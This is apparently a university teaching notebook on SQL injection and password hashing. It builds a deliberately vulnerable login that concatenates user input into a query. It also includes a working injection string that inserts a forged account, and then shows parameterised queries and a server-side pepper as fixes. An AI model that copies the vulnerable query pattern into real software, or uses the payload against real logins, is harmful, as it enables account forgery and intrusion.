{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# SQL Injection and Password Security\n",
    "\n",
    "In this notebook, we show how in a simple scenario SQL injection can be used to forge user accounts for a website that does not offer registrations for new users. The notebook uses some code from [this blog post](https://www.vitoshacademy.com/hashing-passwords-in-python/) on how to hash passwords in Python by Alessandro Molina.\n",
    "\n",
    "Copyright Marcel Maltry & Jens Dittrich, [Big Data Analytics Group](https://bigdata.uni-saarland.de/), [CC-BY-SA](https://creativecommons.org/licenses/by-sa/4.0/legalcode)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Setup\n",
    "\n",
    "We start by defining two functions for hashing passwords and verifying given passwords against a hash.\n",
    "\n",
    "`hash_password()` first generates a random `salt` string consisting of 64 characters. We then compute the hash `pwdhash` of the provided password and salt using [`scrypt`](https://bitbucket.org/mhallin/py-scrypt/src/default/), a state of the art cryptographic hash function. We use the randomly generated `salt` since the same passwords will later have different hash values because it is very unlikely that their hash was created using the same salt. Finally, `hash_password()` returns both `salt` and the password hash `pwdhash` since we can only check a plain password against `pwdhash` if we also have access to the `salt` that was used to compute the hash.\n",
    "\n",
    "`verify_password()` takes the hashed password `pwdhash`, the `salt` used for hashing, and a plain text password `pwdcheck` that should be verified. It first computes the hash `pwdcheckhash` of the plain password and the salt and then compares it against `pwdhash`. If both match, we assume the password to be correct.\n",
    "\n",
    "Below we provide implementations for both `hash_password()` and `verify_password()` along with a simple `unittest` to check whether the functions work as intended."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import hashlib, scrypt, binascii, os\n",
    "\n",
    "def hash_password(password):\n",
    "    # generate salt from 60 byte random string\n",
    "    salt = hashlib.sha256(os.urandom(60)).hexdigest()\n",
    "    \n",
    "    # hash password, salt with scrypt and convert to ascii\n",
    "    pwdhash = binascii.hexlify(scrypt.hash(password, salt)).decode()\n",
    "    \n",
    "    return pwdhash, salt\n",
    "\n",
    "def verify_password(pwdhash, salt, pwdcheck):\n",
    "    # hash pwdcheck, salt with scypt and convert to ascii\n",
    "    pwdcheckhash = binascii.hexlify(scrypt.hash(pwdcheck, salt)).decode()\n",
    "    \n",
    "    # compare pwdcheckhash with pwdhash\n",
    "    return pwdcheckhash == pwdhash"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "test_correct (__main__.TestPwHash) ... ok\n",
      "test_incorrect (__main__.TestPwHash) ... ok\n",
      "\n",
      "----------------------------------------------------------------------\n",
      "Ran 2 tests in 0.329s\n",
      "\n",
      "OK\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "<unittest.main.TestProgram at 0x7fc5fc24be80>"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import unittest\n",
    "\n",
    "class TestPwHash(unittest.TestCase):\n",
    "\n",
    "    def test_correct(self):\n",
    "        pwd = 'S0m3Stup1dP4ssw0rd?'\n",
    "        pwdhash, salt = hash_password(pwd)\n",
    "        self.assertTrue(verify_password(pwdhash, salt, pwd))\n",
    "       \n",
    "        pwd = 'Y3tAn0th3rP4ssw0rd ¯\\_(ツ)_/¯'\n",
    "        pwdhash, salt = hash_password(pwd)\n",
    "        self.assertTrue(verify_password(pwdhash, salt, pwd))\n",
    "\n",
    "    def test_incorrect(self):\n",
    "        pwd = 'S0m3Stup1dP4ssw0rd?'\n",
    "        incorrectpw = 'Bruteforcegeneratedpw'\n",
    "        pwdhash, salt = hash_password(pwd)\n",
    "        self.assertFalse(verify_password(pwdhash, salt, incorrectpw))\n",
    "        \n",
    "        pwd = 'Y3tAn0th3rP4ssw0rd ¯\\_(ツ)_/¯'\n",
    "        incorrectpw = 'Brutforcing all day!'\n",
    "        pwdhash, salt = hash_password(pwd)\n",
    "        self.assertFalse(verify_password(pwdhash, salt, incorrectpw))\n",
    "        \n",
    "## Run the unit test without shutting down the jupyter kernel\n",
    "unittest.main(argv=['ignored', '-v'], verbosity=2, exit=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We then create a table for example user accounts with the following attributes:\n",
    "* `id`: A automatically generated id of the user account,\n",
    "* `username`: A unique username of the user account,\n",
    "* `pwdhash`: The hash computed from the user porvided password and salt,\n",
    "* `salt`: The salt used for hashing the password.\n",
    "\n",
    "We populate the table with some example tuples.\n",
    "\n",
    "**Note**: This notebook is supposed to showcase the risk of *SQL injection* in a realisitic setting. SQL injection is independent of how user credentials are stored (plain text, hashed, hashed and salted, ...)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "import psycopg\n",
    "\n",
    "dsn = 'dbname=postgres user=postgres host=/var/run/postgresql/'  # host may be /tmp/ on other systems\n",
    "\n",
    "uname_pw = [('immanuel','ThisIsImmi'),\n",
    "            ('joris', 'bestpwintheworld.'),\n",
    "            ('kai', 'secretstr1ng'),\n",
    "            ('felix', 'gueswaht?'),\n",
    "            ('lukas', 'youll_never_know'),\n",
    "            ('marcel', 's3cby0psc')]\n",
    "\n",
    "def init_db(dsn):\n",
    "    \n",
    "    with psycopg.connect(dsn) as conn:\n",
    "        \n",
    "        # Open a cursor to perform database operations\n",
    "        with conn.cursor() as cur:\n",
    "\n",
    "            # Drop table if existing\n",
    "            cur.execute(\"DROP TABLE IF EXISTS users;\")\n",
    "\n",
    "            # Create accounts table\n",
    "            cur.execute(\"\"\"CREATE TABLE users\n",
    "                          (id SERIAL PRIMARY KEY,\n",
    "                           username varchar(42) UNIQUE,\n",
    "                           pwdhash char(128),\n",
    "                           salt char(64));\"\"\")\n",
    "\n",
    "            # Insert sample data into accounts table\n",
    "            cur.executemany(\"\"\"INSERT INTO users(username, pwdhash, salt) VALUES (%s, %s, %s);\"\"\",\n",
    "                            ((u, *hash_password(p)) for u, p in uname_pw))\n",
    "\n",
    "conn = psycopg.connect(dsn)\n",
    "conn.autocommit = True\n",
    "\n",
    "init_db(dsn)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Insecure Login\n",
    "\n",
    "We first implement an insecure login routine `insec_login()` that does not sanitize the user provided input. First, we send a query to the database that retrieves the `pwdhash` and `salt` for the provided username. If there is no record, the user does not exist. Then, it is verified that the password provided is correct. If so, we return `True` otherwise, we know that username and password do not match.\n",
    "\n",
    "Note that the query that is sent to the database to request `pwdhash` and `salt` is created by blindly inserting the user provided username into a string query template, and thus being vulnerable to SQL injection as is shown next."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "class UserNotFoundException(Exception):\n",
    "    \"\"\"User was not found in database.\"\"\"\n",
    "    pass\n",
    "\n",
    "class UserAndPasswordMismatchException(Exception):\n",
    "    \"\"\"User and password do not match.\"\"\"\n",
    "    pass\n",
    "\n",
    "def insec_login(username, password, debug=False, verbose=True):\n",
    "    # open cursor to perform db operation\n",
    "    cur = conn.cursor()\n",
    "    \n",
    "    # retrieve pwdhash and salt from db\n",
    "    # the following line with a string concat is the problem\n",
    "    # this enables SQL injection:\n",
    "    sql_query = f\"SELECT pwdhash, salt FROM users WHERE username=\\'{username}\\';\" \n",
    "    if verbose:\n",
    "        print(f\"We constructed the following SQL-query:\\n{sql_query}\")\n",
    "    cur.execute(sql_query)\n",
    "    if debug:\n",
    "        print(cur.query)\n",
    "    if cur.rowcount < 1:\n",
    "        raise UserNotFoundException\n",
    "    (pwdhash, salt) = cur.fetchone()\n",
    "    if verbose:\n",
    "        print(f\"The SQL-query retrieved:\\npwdhash:{pwdhash}\\nsalt:{salt}\")\n",
    "    cur.close()\n",
    "    \n",
    "    # check pwd\n",
    "    if not verify_password(pwdhash, salt, password):\n",
    "        raise UserAndPasswordMismatchException\n",
    "    \n",
    "    # login successful\n",
    "    return True"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We will be able to login, if we provide a username and password that are present in the database."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "We constructed the following SQL-query:\n",
      "SELECT pwdhash, salt FROM users WHERE username='joris';\n",
      "The SQL-query retrieved:\n",
      "pwdhash:0c569a501423d0a89c905ba4e26d2c6ebe31ae39e375c362c9fd4fd4ec290eed26532428673f0acd53362ca47f685f37fa01ed42dc995e852a1cbeed758a9b0f\n",
      "salt:25d27fe1af545e96f6986567915672b6105f448fc3d31bc9bc69f37b5bbef4be\n",
      "Login successful: True\n"
     ]
    }
   ],
   "source": [
    "# successful login\n",
    "print(f\"Login successful: {insec_login('joris', 'bestpwintheworld.')}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Next, we want to show that `insec_login()` is vulnerable to SQL injection.\n",
    "\n",
    "Assume that we are an attacker who wants to get access to the system but does not have a user account. Further assume, that accounts can only be created by the database administrator. We can exploit that the insecure login sends query input directly to the database without sanatizing it. Our exploit works in three steps:\n",
    "1. We choose a username and plain text password with which we want to be able to log in later.\n",
    "2. We choose salt and hash our plain password with the it.\n",
    "3. We compose a string that we provide as username to the database that will generate a useraccount for us.\n",
    "\n",
    "The last step consists of three parts:\n",
    "1. We close the ticks in which the login routine usually inserts the username and complete the query (`';`). This this will cause the login attempt to fail but we only care about creating a user account for now.\n",
    "2. We appen the `INSERT` statement that puts our user account with `username`, `pwdhash`, and `salt` into the database (`INSERT INTO user(username, pwdhash, salt) VALUE ...`).\n",
    "3. We do not know how the query template ends so any remaning stuff will be commented out to have a syntactically correct query (`--`).\n",
    "\n",
    "In the end, we print the `evil_string` that should be provided as username on login."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Insert this as username on login:\n",
      "'; INSERT INTO users(username, pwdhash, salt) VALUES('student', 'ce65df4add0866ebef7969a3522734dad70730244e78d0c01b4d5018b6de417d42c8a9b1e3fdf994f5e983fd7fd35bd3c6fa4b771e51fe0b697023b8a6a93047', '0000000000000000000000000000000000000000000000000000000000000000'); --\n"
     ]
    }
   ],
   "source": [
    "# Choose attacker's username and password\n",
    "evil_username = 'student'\n",
    "evil_password = 'evil_pwd'\n",
    "\n",
    "def build_evil_string(evil_username, evil_password):\n",
    "\n",
    "    # Compute attacker's pwdhash and salt\n",
    "    evil_salt = '0'*64\n",
    "    evil_pwdhash = binascii.hexlify(scrypt.hash(evil_password, evil_salt)).decode()\n",
    "\n",
    "    # Build sql injection string\n",
    "    evil_string = f\"\\'; \"\\\n",
    "                  f\"INSERT INTO users(username, pwdhash, salt) VALUES\"\\\n",
    "                  f\"(\\'{evil_username}\\', \\'{evil_pwdhash}\\', \\'{evil_salt}\\');\"\\\n",
    "                  f\" --\"\n",
    "    \n",
    "    return evil_string\n",
    "\n",
    "\n",
    "evil_string = build_evil_string(evil_username, evil_password)\n",
    "print(f\"Insert this as username on login:\\n{evil_string}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The next cell will ask us for a username and password and then try to log in with whatever we provided. If we now provide the `evil_string` as username and anything as password, the login will fail but a username with the credentials from above is created."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Username:'; INSERT INTO users(username, pwdhash, salt) VALUES('student', 'ce65df4add0866ebef7969a3522734dad70730244e78d0c01b4d5018b6de417d42c8a9b1e3fdf994f5e983fd7fd35bd3c6fa4b771e51fe0b697023b8a6a93047', '0000000000000000000000000000000000000000000000000000000000000000'); --\n",
      "Password:test\n",
      "We constructed the following SQL-query:\n",
      "SELECT pwdhash, salt FROM users WHERE username=''; INSERT INTO users(username, pwdhash, salt) VALUES('student', 'ce65df4add0866ebef7969a3522734dad70730244e78d0c01b4d5018b6de417d42c8a9b1e3fdf994f5e983fd7fd35bd3c6fa4b771e51fe0b697023b8a6a93047', '0000000000000000000000000000000000000000000000000000000000000000'); --';\n",
      "Error occurred during login.\n"
     ]
    }
   ],
   "source": [
    "username = input(\"Username:\")\n",
    "password = input(\"Password:\")\n",
    "\n",
    "try:\n",
    "    insec_login(username, password)\n",
    "except Exception:\n",
    "    print(\"Error occurred during login.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We are now able to login with the forged account from above."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "We constructed the following SQL-query:\n",
      "SELECT pwdhash, salt FROM users WHERE username='student';\n",
      "The SQL-query retrieved:\n",
      "pwdhash:ce65df4add0866ebef7969a3522734dad70730244e78d0c01b4d5018b6de417d42c8a9b1e3fdf994f5e983fd7fd35bd3c6fa4b771e51fe0b697023b8a6a93047\n",
      "salt:0000000000000000000000000000000000000000000000000000000000000000\n",
      "Login successful: True\n"
     ]
    }
   ],
   "source": [
    "print(f\"Login successful: {insec_login(evil_username, evil_password)}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Prevent Attack \n",
    "\n",
    "There are two ways to prevent this specific type of attack. We can either define a more secure login function that makes use of prepared statements or we can add a bit of complexity to the hashing process of the passwords ([salt+pepper](https://security.stackexchange.com/a/3289)). We will showcase both solutions in the following. Ideally, we implement both.\n",
    "\n",
    "\n",
    "## Secure Login with Prepared Statement\n",
    "\n",
    "In the login procedure above, the attacker makes use of the fact that the parameter `username` is not evaluated semantically. The system just assumes that it is valid and inserts it as username in prepared SQL query. The attack can be avoided if we make sure that the database interprets the entire `username` as string and we separate the SQL code from the input data.\n",
    "\n",
    "Prepared statements are explained in more detail in the [SQL Injection](https://github.com/BigDataAnalyticsGroup/bigdataengineering/blob/master/SQL%20Injection.ipynb) notebook.\n",
    "\n",
    "Below, we define a secure login procedure using a prepared statement."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "def sec_login(uname, pwd, debug=False):\n",
    "    # open cursor to perform db operation\n",
    "    cur = conn.cursor()\n",
    "    \n",
    "    # retrieve pwdhash and salt from db with sanitized query\n",
    "    cur.execute(\"SELECT pwdhash, salt FROM users WHERE username=%s;\", (uname,))\n",
    "    if debug:\n",
    "        print(cur.query)\n",
    "    if cur.rowcount < 1:\n",
    "        raise Exception\n",
    "    (pwdhash, salt) = cur.fetchone()\n",
    "    cur.close()\n",
    "    \n",
    "    # check pwd\n",
    "    if not verify_password(pwdhash, salt, pwd):\n",
    "        raise Exception\n",
    "    \n",
    "    # login successful\n",
    "    return True"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Existing users can still login without any problem."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Login successful: True\n"
     ]
    }
   ],
   "source": [
    "# Successful login\n",
    "try:\n",
    "    print(f\"Login successful: {sec_login('immanuel', 'ThisIsImmi')}\")\n",
    "except Exception:\n",
    "    print(\"It did not work.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We can now try the same attack from above with a new username."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Insert this as username on login:\n",
      "'; INSERT INTO users(username, pwdhash, salt) VALUES('student2', '59d5f8185ff7ebb328afdaa4a57861a8bcd3b42a01fd1b493b535bf3467dcb8aabffc63f427abf9c5ce87bcc2518d34facd192e9340173c0e5f96638bc8156b0', '0000000000000000000000000000000000000000000000000000000000000000'); --\n"
     ]
    }
   ],
   "source": [
    "evil_username = 'student2'\n",
    "evil_password = 'who needs security, right?'\n",
    "\n",
    "evil_string = build_evil_string(evil_username, evil_password)\n",
    "print(f\"Insert this as username on login:\\n{evil_string}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Username:'; INSERT INTO users(username, pwdhash, salt) VALUES('student2', '59d5f8185ff7ebb328afdaa4a57861a8bcd3b42a01fd1b493b535bf3467dcb8aabffc63f427abf9c5ce87bcc2518d34facd192e9340173c0e5f96638bc8156b0', '0000000000000000000000000000000000000000000000000000000000000000'); --\n",
      "Password:test\n",
      "Error occurred during login.\n"
     ]
    }
   ],
   "source": [
    "uname = input(\"Username:\")\n",
    "pwd = input(\"Password:\")\n",
    "\n",
    "try:\n",
    "    sec_login(uname, pwd)\n",
    "except Exception:\n",
    "    print(\"Error occurred during login.\")   "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Since the user input was properly separated from the SQL code the insert part was not executed and, thus, no new user account was created. Therefore, logging in fails."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "It did not work.\n"
     ]
    }
   ],
   "source": [
    "try:\n",
    "    print(f\"Login successful: {sec_login(evil_username, evil_password)}\")\n",
    "except Exception:\n",
    "    print(\"It did not work.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Hashing Passwords with Salt and Pepper\n",
    "\n",
    "The attack from above works because we are able to insert our own salt into the database and, thus, when checking for the correctness of a password during login, the system uses our salt to compute the hash that is compared against the one we inserted into the database.\n",
    "\n",
    "The attack can be avoided by adding a secret that is only known on the server-side, called pepper. Instead of computing the hash like\n",
    "\n",
    "```python\n",
    "scrypt.hash(password, salt)\n",
    "```\n",
    "\n",
    "we introduce a secret string `pepper` that is used for computing the hash like\n",
    "\n",
    "```python\n",
    "scrypt.hash(password, salt+pepper)\n",
    "```\n",
    "\n",
    "The secret string `pepper` is only known to the server. This implies that when using the insecure login procedure, we are still able to insert new user accounts into the database. However, since we do not know the secret `pepper`, the hash we compute and insert will not match the hash that the server computes when verifying the user provided password upon loggin in."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.5"
  },
  "varInspector": {
   "cols": {
    "lenName": 16,
    "lenType": 16,
    "lenVar": 40
   },
   "kernels_config": {
    "python": {
     "delete_cmd_postfix": "",
     "delete_cmd_prefix": "del ",
     "library": "var_list.py",
     "varRefreshCmd": "print(var_dic_list())"
    },
    "r": {
     "delete_cmd_postfix": ") ",
     "delete_cmd_prefix": "rm(",
     "library": "var_list.r",
     "varRefreshCmd": "cat(var_dic_list()) "
    }
   },
   "types_to_exclude": [
    "module",
    "function",
    "builtin_function_or_method",
    "instance",
    "_Feature"
   ],
   "window_display": false
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
